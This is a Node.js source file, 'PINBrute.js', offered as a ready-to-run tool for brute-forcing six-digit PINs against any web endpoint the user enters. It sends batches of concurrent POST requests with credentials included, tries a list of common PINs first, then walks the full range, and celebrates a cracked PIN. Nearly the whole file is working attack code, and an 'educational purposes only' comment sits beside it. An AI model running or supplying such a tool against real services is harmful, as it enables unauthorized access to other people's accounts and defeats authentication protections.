/*
░█████████  ░██████░███    ░██ ░████████                          ░██               
░██     ░██   ░██  ░████   ░██ ░██    ░██                         ░██               
░██     ░██   ░██  ░██░██  ░██ ░██    ░██  ░██░████ ░██    ░██ ░████████  ░███████  
░█████████    ░██  ░██ ░██ ░██ ░████████   ░███     ░██    ░██    ░██    ░██    ░██ 
░██           ░██  ░██  ░██░██ ░██     ░██ ░██      ░██    ░██    ░██    ░█████████ 
░██           ░██  ░██   ░████ ░██     ░██ ░██      ░██   ░███    ░██    ░██        
░██         ░██████░██    ░███ ░█████████  ░██       ░█████░██     ░████  ░███████  
*/

// PINBrute.js - This script can brute force up to six didget pin numbers. 
// Developed by: ozrvv on github, This script is for educational purposes only, 
// please do not use it on a real target as that is not legal.

// Usage: node PINBrute.js [start] [end] > EXAMPLE: node PINBrute.js 000000 999999
// The listed example above enumerates the possible pin numbers from 000000 to 999999

// After entering the Usage command you will see a prompt in the terminal, 
// which will make you enter the Target of the PIN Enumeration Attack.
// EXAMPLE Target: https://google.com

// Keep in mind that PIN Brute forcing takes time, 
// this can take a while based on the PIN Parameters you set.

// CHECKOUT THE README FILE FOR ADDITIONAL INFORMATION!

import readline from 'readline';

let TARGET_URL = '';
const CONCURRENT_REQUESTS = 5;
const DELAY_MS = 100;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function ask(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise(resolve => {
    rl.question(question, answer => {
      rl.close();
      resolve(answer);
    });
  });
}

async function tryPin(pin) {
  const pinStr = pin.toString().padStart(6, '0');

  try {
    const response = await fetch(TARGET_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ pin: pinStr }),
      credentials: 'include'
    });

    let data = null;

    try {
      data = await response.json();
    } catch {
      data = {};
    }

    const success = response.ok && data.ok === true;

    return {
      pin: pinStr,
      success,
      status: response.status,
      data
    };

  } catch (error) {
    return {
      pin: pinStr,
      success: false,
      error: error.message
    };
  }
}

async function smartGuess() {
  const commonPins = [
    '000000', '111111', '222222', '333333', '444444',
    '555555', '666666', '777777', '888888', '999999',
    '123456', '654321', '123123', '112233',
    '121212', '111222', '222111', '101010'
  ];

  console.log('Trying common PIN patterns first...');

  for (const pin of commonPins) {
    const result = await tryPin(parseInt(pin));

    if (result.success) {
      console.log(`\n YAYY!! PIN found: ${result.pin}, Enjoy the cracked PIN :3`);
      return true;
    }

    await sleep(200);
  }

  console.log('Common patterns failed... LETS TRY MORE!\n');
  return false;
}

async function bruteForce(start = 0, end = 999999) {
  console.log(`Starting brute force from ${String(start).padStart(6, '0')} to ${String(end).padStart(6, '0')}`);
  console.log(`Total combinations: ${end - start + 1}`);

  let tested = 0;
  let lastReport = Date.now();

  for (let i = start; i <= end; i += CONCURRENT_REQUESTS) {
    const batch = [];

    for (let j = 0; j < CONCURRENT_REQUESTS; j++) {
      if (i + j <= end) {
        batch.push(tryPin(i + j));
      }
    }

    const results = await Promise.all(batch);
    tested += results.length;

    const found = results.find(r => r.success);
    if (found) {
      console.log(`\n YAYY!! PIN found: ${found.pin}, Enjoy the cracked PIN :3`);
      return;
    }

    if (Date.now() - lastReport > 5000) {
      const progress = ((i - start) / (end - start) * 100).toFixed(2);
      console.log(
        `Progress: ${progress}% | Tested: ${tested} | Current: ${String(i).padStart(6, '0')}`
      );
      lastReport = Date.now();
      tested = 0;
    }

    await sleep(DELAY_MS);
  }

  console.log('\nPIN not found in range :c');
}

const startPin = Number(process.argv[2]);
const endPin = Number(process.argv[3]);

const start = Number.isFinite(startPin) ? startPin : 0;
const end = Number.isFinite(endPin) ? endPin : 999999;

console.log('â ï¸ Loading da PIN Brute Force! â ï¸');

setTimeout(async () => {
  TARGET_URL = await ask('please enter target: ');

  console.log(`Your Target: ${TARGET_URL}`);
  console.log('Starting in 3 seconds...\n');

  const foundSmart = await smartGuess();
  if (!foundSmart) {
    await bruteForce(start, end);
  }
}, 3000);